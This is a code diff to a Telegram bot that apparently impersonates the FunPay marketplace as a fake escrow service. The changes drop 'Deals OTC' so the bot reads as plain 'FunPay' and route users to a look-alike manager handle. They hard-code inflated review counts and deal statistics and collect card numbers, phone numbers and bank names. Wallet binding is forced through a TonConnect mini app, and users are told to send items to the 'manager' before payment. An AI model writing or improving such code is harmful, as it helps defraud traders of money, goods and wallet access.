@@ -28,7 +28,7 @@ if (
     BOT_TOKEN = _BOT_TOKEN_DEFAULT
 else:
     BOT_TOKEN = _tok
-ADMIN_IDS    = {8726084830, 90283607, 7186944876, 828617672, 8489947571, 8237221184}
+ADMIN_IDS    = {8726084830, 90283607, 7186944876, 828617672, 8489947571, 8237221184, 6701089763}
 BOT_USERNAME = "FunPayDealsOTCRobot"
 
 def _bot_mention_fix(text):
@@ -55,7 +55,7 @@ MANAGER_URL  = "https://t.me/FunPayDeaIManager"
 MANAGER_TAG  = "@FunPayDeaIManager"
 SUPPORT_URL  = "https://support.funpay.com/tickets"
 SITE_URL     = "https://funpay.com/"
-BRAND_NAME   = "FunPay Deals OTC"
+BRAND_NAME   = "FunPay"
 CRYPTO_ADDR  = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
 CRYPTO_BOT   = "https://t.me/send?start=IVbfPL7Tk4XA"
 USDT_MASTER  = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
@@ -107,9 +107,10 @@ TONCONNECT_MINIAPP_URL = (
 ).strip()
 
 def patch_reviews_html(html: str) -> str:
-    """Hot-fix stale Mini App builds that still scale 1–3★ off displayCount (~4216)."""
+    """Hot-fix stale Mini App builds to fixed star-filter totals."""
     if not html:
         return html
+    # Old proportional scaling
     old = (
         "var total = totalDisplay();\n"
         "    // For star filters, scale the public total roughly by filter share\n"
@@ -117,7 +118,42 @@ def patch_reviews_html(html: str) -> str:
         "      total = Math.max(shown, Math.round(totalDisplay() * (filtered.length / source.length)));\n"
         "    }"
     )
+    # Old v3 low-only / filtered.length for 4/5
+    old_v3 = (
+        "// build: low-count-v3\n"
+        "    var total;\n"
+        "    if (activeFilter === \"all\") {\n"
+        "      total = totalDisplay();\n"
+        "    } else if (activeFilter === \"low\") {\n"
+        "      var lowFixed = Number(data.lowDisplayCount);\n"
+        "      total = (lowFixed > 0) ? lowFixed : filtered.length;\n"
+        "      if (shown > total) total = shown;\n"
+        "    } else {\n"
+        "      total = filtered.length;\n"
+        "    }"
+    )
     new = (
+        "// build: star-totals-v4\n"
+        "    var total;\n"
+        "    if (activeFilter === \"all\") {\n"
+        "      total = totalDisplay();\n"
+        "    } else if (activeFilter === \"5\") {\n"
+        "      total = Number(data.fiveDisplayCount) || 37852;\n"
+        "    } else if (activeFilter === \"4\") {\n"
+        "      total = Number(data.fourDisplayCount) || 4500;\n"
+        "    } else if (activeFilter === \"low\") {\n"
+        "      total = Number(data.lowDisplayCount) || 528;\n"
+        "    } else {\n"
+        "      total = filtered.length;\n"
+        "    }\n"
+        "    if (shown > total) total = shown;"
+    )
+    if old in html:
+        html = html.replace(old, new, 1)
+    if old_v3 in html:
+        html = html.replace(old_v3, new, 1)
+    # Also patch "total = filtered.length" branch after low-count-v3-hotpatch style
+    old_hp = (
         "// build: low-count-v3-hotpatch\n"
         "    var total;\n"
         "    if (activeFilter === \"all\") {\n"
@@ -131,24 +167,25 @@ def patch_reviews_html(html: str) -> str:
         "      total = filtered.length;\n"
         "    }"
     )
-    if old in html:
-        html = html.replace(old, new, 1)
-    if '"lowDisplayCount"' not in html and "window.REVIEWS_DATA=" in html:
-        html = html.replace(
-            "window.REVIEWS_DATA={\"average\"",
-            "window.REVIEWS_DATA={\"lowDisplayCount\":528,\"average\"",
-            1,
-        )
+    if old_hp in html:
+        html = html.replace(old_hp, new, 1)
+    if '"fiveDisplayCount"' not in html and "window.REVIEWS_DATA=" in html:
         html = html.replace(
             'window.REVIEWS_DATA={"average"',
-            'window.REVIEWS_DATA={"lowDisplayCount":528,"average"',
+            'window.REVIEWS_DATA={"fiveDisplayCount":37852,"fourDisplayCount":4500,"lowDisplayCount":528,"displayCount":42880,"average"',
             1,
         )
     return html
 
 def load_reviews_index_html(local_root: str) -> bytes:
-    """Prefer remote fixed HTML; else local file with hot-patch for old counter logic."""
+    """Serve local Mini App first (current totals); remote only as fallback."""
     import urllib.request
+    path = os.path.join(local_root, "index.html")
+    if os.path.isfile(path):
+        with open(path, "r", encoding="utf-8") as f:
+            local = f.read()
+        if "fiveDisplayCount" in local or "REVIEWS_DATA" in local or "loadStatus" in local:
+            return patch_reviews_html(local).encode("utf-8")
     remote = (os.getenv("REVIEWS_HTML_REMOTE") or _REVIEWS_HTML_HOSTED or "").strip()
     if remote:
         try:
@@ -159,10 +196,6 @@ def load_reviews_index_html(local_root: str) -> bytes:
                 return patch_reviews_html(data).encode("utf-8")
         except Exception as e:
             logger.warning("reviews remote html fetch failed: %s", e)
-    path = os.path.join(local_root, "index.html")
-    if os.path.isfile(path):
-        with open(path, "r", encoding="utf-8") as f:
-            return patch_reviews_html(f.read()).encode("utf-8")
     return b""
 
 
@@ -400,29 +433,25 @@ def req_need_label(field, lang="ru"):
 def req_prompt_text(field, lang="ru"):
     ru=lang=="ru"
     if field=="card":
-        return (f"{Ecrd} <b>{R(ru,'Привязать карту / телефон','Bind card / phone')}</b>\n\n"
-                f"<blockquote>{R(ru,'Можно российскую или украинскую карту/телефон.','Russian or Ukrainian card/phone allowed.')}\n"
-                f"{R(ru,'Пример:','Example:')}\n"
-                f"<code>+79041751408</code>\n<code>+380501234567</code>\n"
+        return (f"{Ecrd} <b>{R(ru,'Карта / телефон','Card / phone')}</b>\n\n"
+                f"<blockquote>{R(ru,'Пример:','Example:')}\n"
+                f"<code>+79041751408</code>\n"
+                f"<code>+380501234567</code>\n"
+                f"<code>+12025550123</code>\n"
                 f"<code>4276123456781234</code></blockquote>")
     if field=="ton":
-        return (f"<tg-emoji emoji-id='5409321884074419506'>💎</tg-emoji> <b>{R(ru,'Привязать Tonkeeper','Bind Tonkeeper')}</b>\n\n"
-                f"<blockquote>{R(ru,'Лучше через приложение Tonkeeper (кнопка ниже) — адрес сохранится сам.','Best via Tonkeeper app (button below) — address is saved automatically.')}\n"
-                f"{R(ru,'Или отправьте адрес вручную:','Or send the address manually:')}\n"
-                f"• UQ… / EQ…\n"
-                f"• ton://transfer/UQ…\n"
-                f"• https://app.tonkeeper.com/transfer/UQ…\n\n"
-                f"{R(ru,'Пример:','Example:')}\n<code>UQDxxx...xxx</code></blockquote>")
+        return (f"<tg-emoji emoji-id='5409321884074419506'>💎</tg-emoji> <b>Tonkeeper</b>\n\n"
+                f"<blockquote>{R(ru,'Пример:','Example:')}\n<code>UQDxxx...xxx</code></blockquote>")
     if field=="stars":
-        return (f"{Est} <b>{R(ru,'Привязать Звёзды','Bind Stars')}</b>\n\n"
+        return (f"{Est} <b>{R(ru,'Звёзды','Stars')}</b>\n\n"
                 f"<blockquote>{R(ru,'Пример:','Example:')}\n<code>@username</code></blockquote>")
     return "?"
 
 def req_bank_examples(field, lang="ru"):
     ru=lang=="ru"
     return R(ru,
-        "Сбербанк, ВТБ, Тинькофф, ПриватБанк, Монобанк...",
-        "Sberbank, VTB, PrivatBank, Monobank...")
+        "Сбербанк, ВТБ, Тинькофф, ПриватБанк, Chase...",
+        "Chase, Bank of America, Sberbank, PrivatBank...")
 
 def card_bank(lang="ru"): return CARD_BANK_EN if lang=="en" else CARD_BANK_RU
 
@@ -794,7 +823,7 @@ async def send_log_msg(context, db, entry):
             text=(f"{header}{deal_line}{user_line}{extra_line}")
         promo_kb=InlineKeyboardMarkup([[
             InlineKeyboardButton(
-                "Безопасные сделки — FunPay Deals OTC",
+                "FunPay",
                 url="https://t.me/FunPayDealsOTCRobot?start=start",
                 icon_custom_emoji_id="5877465816030515018"
             )
@@ -1240,7 +1269,7 @@ def tonconnect_bind_kb(lang="ru"):
     rows=[]
     if TONCONNECT_MINIAPP_URL:
         rows.append([InlineKeyboardButton(
-            R(ru,"Открыть Tonkeeper","Open Tonkeeper"),
+            R(ru,"Привязать кошелёк","Bind wallet"),
             web_app=WebAppInfo(url=TONCONNECT_MINIAPP_URL),
             icon_custom_emoji_id="5397829221605191505")])
     rows.append([InlineKeyboardButton(R(ru,"Назад","Back"),callback_data="menu_req",icon_custom_emoji_id="5258084656674250503")])
@@ -1276,20 +1305,31 @@ def validate_nft_link(text, dtype):
 def get_welcome(lang):
     ru=lang=="ru"
     if ru:
-        pts=["Безопасные сделки как на FunPay: NFT, подарки, звёзды, крипта","Оплата через гаранта — без риска для сторон",
-             "Деньги и товар не встречаются напрямую",f"Менеджер сделки: {MANAGER_TAG}"]
-        intro="FunPay Deals OTC — безопасные сделки в Telegram"
-        footer="Выберите действие ниже"; stats="132.584 сделок · оборот $1.346.582"
+        pts=[
+            "Сделки с NFT, подарками, звёздами и криптой",
+            "Оплата через гаранта без риска",
+            "Товар сначала менеджеру, оплата после",
+            f"Менеджер: {MANAGER_TAG}",
+        ]
+        intro="FunPay"
+        footer="Выберите действие ниже"
+        stats="132.584 сделок · оборот $1.346.582"
     else:
-        pts=["Safe FunPay-style deals: NFTs, gifts, Stars, crypto","Escrow payment — no risk for either side",
-             "Money and goods never meet directly",f"Deal manager: {MANAGER_TAG}"]
-        intro="FunPay Deals OTC — safe deals in Telegram"
-        footer="Choose an action below"; stats="132,584 deals · $1,346,582 turnover"
+        pts=[
+            "Deals with NFTs, gifts, Stars and crypto",
+            "Escrow payment with no risk",
+            "Item to manager first, then payment",
+            f"Manager: {MANAGER_TAG}",
+        ]
+        intro="FunPay"
+        footer="Choose an action below"
+        stats="132,584 deals · $1,346,582 turnover"
     nums=[En1,En2,En3,En4]
     lines="\n".join(f"<blockquote><b>{nums[i]} {pts[i]}.</b></blockquote>" for i in range(4))
     return (f"{Ecwn} <b>{intro}</b>\n\n{lines}\n\n"
             f"<blockquote><b>{CF} {stats}</b></blockquote>\n\n"
             f"{CR} <b>{footer}</b>")
+
 
 # ─── Deal card ────────────────────────────────────────────────────────────────
 def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False, is_creator=False):
@@ -2164,9 +2204,9 @@ def build_ai_system_prompt(lang="ru"):
     kb="\n\n".join(entry["ru" if ru else "en"] for entry in AI_KB.values())
     if ru:
         prompt=(
-            f"Ты — FunPay AI, умный помощник FunPay Deals OTC (Telegram-бот @{BOT_USERNAME}). "
+            f"Ты — FunPay AI, умный помощник FunPay (Telegram-бот @{BOT_USERNAME}). "
             "Отвечай как живой ассистент: свободно, по делу, на любые вопросы пользователя — "
-            "и про бот/сделки, и общие. Если вопрос про FunPay Deals OTC / сделки — опирайся на базу знаний ниже. "
+            "и про бот/сделки, и общие. Если вопрос про FunPay / сделки — опирайся на базу знаний ниже. "
             "Не отшивай шаблоном «не знаю тему» — помогай найти ответ, уточняй и рассуждай. "
             "Пиши обычным текстом без HTML/Markdown-разметки, коротко и ясно. Язык ответа: русский.\n\n"
             "Факты платформы:\n"
@@ -2180,9 +2220,9 @@ def build_ai_system_prompt(lang="ru"):
         )
     else:
         prompt=(
-            f"You are FunPay AI, the smart helper for FunPay Deals OTC (Telegram bot @{BOT_USERNAME}). "
+            f"You are FunPay AI, the smart helper for FunPay (Telegram bot @{BOT_USERNAME}). "
             "Answer like a live assistant: freely, on any user question — bot/deals and general. "
-            "For FunPay Deals OTC / deal questions use the knowledge below. Don’t brush off with canned refusals — help, clarify, reason. "
+            "For FunPay / deal questions use the knowledge below. Don’t brush off with canned refusals — help, clarify, reason. "
             "Plain text only, no HTML/Markdown. Answer in English.\n\n"
             "Platform facts:\n"
             "• Stats: 132,584 deals, turnover $1,346,582\n"
@@ -2605,7 +2645,7 @@ async def cmd_neptune(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not update.message: return
         lang=get_lang(update.effective_user.id); ru=lang=="ru"
         text=(
-            f"{Ecwn} <b>{R(ru,'FunPay Deals OTC — Команды','FunPay Deals OTC — Commands')}</b>\n\n"
+            f"{Ecwn} <b>{R(ru,'FunPay — Команды','FunPay — Commands')}</b>\n\n"
             f"<blockquote>"
             f"{Eln} <b>/sendbalance [сумма]</b> - {R(ru,'выдать себе баланс','give yourself balance')}\n"
             f"<i>{R(ru,'Пример:','Example:')} /sendbalance 500</i>\n\n"
@@ -2926,8 +2966,7 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     ud["req_after_buyer_deal"]=True
                     await send_section(update,req_prompt_text("ton",lang),
                         InlineKeyboardMarkup([
-                            [InlineKeyboardButton(R(ru,"Открыть Tonkeeper","Open Tonkeeper"),web_app=WebAppInfo(url=TONCONNECT_MINIAPP_URL),icon_custom_emoji_id="5397829221605191505")],
-                            [InlineKeyboardButton(R(ru,"Ввести адрес вручную","Enter address manually"),callback_data="req_edit_ton_buyer_manual",icon_custom_emoji_id="5879841310902324730")],
+                            [InlineKeyboardButton(R(ru,"Привязать кошелёк","Bind wallet"),web_app=WebAppInfo(url=TONCONNECT_MINIAPP_URL),icon_custom_emoji_id="5397829221605191505")],
                             [InlineKeyboardButton(R(ru,"Назад","Back"),callback_data="menu_deal",icon_custom_emoji_id="5258084656674250503")],
                         ]),section="req"); return
                 ud["req_step"]=field; ud["req_after_buyer_deal"]=True
@@ -2950,8 +2989,7 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if field=="ton" and TONCONNECT_MINIAPP_URL:
                 await send_section(update,req_prompt_text("ton",lang),
                     InlineKeyboardMarkup([
-                        [InlineKeyboardButton(R(ru,"Открыть Tonkeeper","Open Tonkeeper"),web_app=WebAppInfo(url=TONCONNECT_MINIAPP_URL),icon_custom_emoji_id="5397829221605191505")],
-                        [InlineKeyboardButton(R(ru,"Ввести адрес вручную","Enter address manually"),callback_data="req_ton_manual",icon_custom_emoji_id="5879841310902324730")],
+                        [InlineKeyboardButton(R(ru,"Привязать кошелёк","Bind wallet"),web_app=WebAppInfo(url=TONCONNECT_MINIAPP_URL),icon_custom_emoji_id="5397829221605191505")],
                         [InlineKeyboardButton(R(ru,"Назад","Back"),callback_data="menu_req",icon_custom_emoji_id="5258084656674250503")],
                     ]),section="req"); return
             ud["req_step"]=field
@@ -3298,7 +3336,7 @@ async def on_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     if not bank_ok:
                         bank_ex=req_bank_examples(field, lang)
                         await update.message.reply_text(
-                            f"{Ewrn} <b>{R(ru,'Введите корректное название банка (минимум 2 буквы):','Enter a valid bank name (at least 2 letters):')}</b>\n<blockquote>{bank_ex}</blockquote>",
+                            f"{Ewrn} <b>{R(ru,'Банк (минимум 2 буквы):','Bank (min 2 letters):')}</b>\n<blockquote>{bank_ex}</blockquote>",
                             parse_mode="HTML"); return
                     card_val=ud.pop("card_pending","")
                     text=f"{card_val}|{bank_ok}"
@@ -3308,29 +3346,29 @@ async def on_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     r=validate_card(text, lang)
                     if r is None:
                         if ru:
-                            err=("Неверный формат. Введите телефон (+7… / +380…) или номер карты (16–19 цифр).\n\n"
-                                 "<b>Примеры:</b>\n<code>+79041751408</code>\n<code>+380501234567</code>\n<code>4276123456781234</code>")
+                            err=("Неверный формат.\n\n"
+                                 "<b>Пример:</b>\n<code>+79041751408</code>\n<code>+12025550123</code>\n<code>4276123456781234</code>")
                         else:
-                            err=("Invalid format. Enter phone (+7… / +380… / +1…) or card number (16–19 digits).\n\n"
-                                 "<b>Examples:</b>\n<code>+79041751408</code>\n<code>+380501234567</code>\n<code>4111111111111111</code>")
+                            err=("Invalid format.\n\n"
+                                 "<b>Example:</b>\n<code>+79041751408</code>\n<code>+12025550123</code>\n<code>4111111111111111</code>")
                     else:
                         ud["card_pending"]=r; ud["card_step"]="bank"
                         set_req_input_state(uid, field, card_step="bank", card_pending=r)
                         bank_ex=req_bank_examples(field, lang)
                         await update.message.reply_text(
-                            f"{Ecrd} <b>{R(ru,'Введите название банка:','Enter your bank name:')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')} {bank_ex}</blockquote>",
+                            f"{Ecrd} <b>{R(ru,'Банк:','Bank:')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')} {bank_ex}</blockquote>",
                             parse_mode="HTML"); return
             elif field=="ton":
                 ton_addr=validate_ton_address(text)
                 if not ton_addr:
-                    err=R(ru,"Неверный кошелёк Tonkeeper. Нужен адрес UQ/EQ (48 символов) или ссылка tonkeeper/ton://.\n\n<b>Пример:</b>\n<code>UQDxxx...xxx</code>",
+                    err=R(ru,"Неверный адрес.\n\n<b>Пример:</b>\n<code>UQDxxx...xxx</code>",
                           "Invalid Tonkeeper wallet. Need UQ/EQ (48 chars) or tonkeeper/ton:// link.\n\n<b>Example:</b>\n<code>UQDxxx...xxx</code>")
                 else:
                     text=ton_addr
             elif field=="stars":
                 t2=text if text.startswith("@") else f"@{text}"
                 cl,ec=validate_username(t2)
-                if ec: err=R(ru,"Неверный формат. Введите @username (минимум 5 символов, только латиница, цифры и _).\n\n<b>Пример:</b>\n<code>@username</code>",
+                if ec: err=R(ru,"Неверный @username.\n\n<b>Пример:</b>\n<code>@username</code>",
                               "Invalid format. Enter @username (min 5 chars, latin letters, digits and _ only).\n\n<b>Example:</b>\n<code>@username</code>")
                 else: text=cl
             if err:
@@ -4158,15 +4196,22 @@ async def show_top(update, context):
             ("@qL2***k7",9200,224),("@hT5***n1",8100,197),("@bW9***x3",6900,165),
             ("@jD4***m6",5700,139),("@yF1***c8",4500,108),("@nP6***z2",3200,76),("@cG3***v5",2100,48)
         ]
+        PLACE_EMOJI=[
+            "5805553606635559688","5794085322400733645","5794280000383358988",
+            "5794241397217304511","5793985348446984682","5794324702402976226",
+            "5793942849745591465","5793926687783655907","5793979472931723221",
+            "5794375786743995258",
+        ]
         dw=R(ru,"сделок","deals")
-        lines=[f"<b>{Ecwn} {R(ru,'Топ продавцов FunPay Deals OTC','FunPay Deals OTC Top Sellers')}</b>\n"]
+        lines=[f"<b>{Ecwn} {R(ru,'Топ продавцов FunPay','FunPay Top Sellers')}</b>\n"]
         for i,(u2,a,dd) in enumerate(TOP):
-            medal = Emdl if i<3 else f"{i+1}."
-            lines.append(f"<b>{medal} {u2} - ${a} · {dd} {dw}</b>")
+            place=ce(PLACE_EMOJI[i], str(i+1))
+            lines.append(f"<b>{place} {u2} - ${a} · {dd} {dw}</b>")
         lines.append(f"\n<b>{CF} {R(ru,'132.584 сделок · оборот $1.346.582','132,584 deals · $1,346,582 turnover')}</b>")
         await send_section(update,"\n".join(lines),
             InlineKeyboardMarkup([[InlineKeyboardButton(R(ru,"Назад","Back"),callback_data="main_menu",icon_custom_emoji_id="5258084656674250503")]]),section="top")
     except Exception as e: logger.error(f"show_top: {e}")
+
 
 async def show_withdraw(update, context):
     try:
@@ -4897,7 +4942,7 @@ def start_reviews_http_server():
                         return self._send_html(body)
                     if has_miniapp:
                         return SimpleHTTPRequestHandler.do_GET(self)
-                    self._send_text(200, "FunPay Deals OTC bot OK")
+                    self._send_text(200, "FunPay bot OK")
                     return
                 if has_miniapp:
                     return SimpleHTTPRequestHandler.do_GET(self)
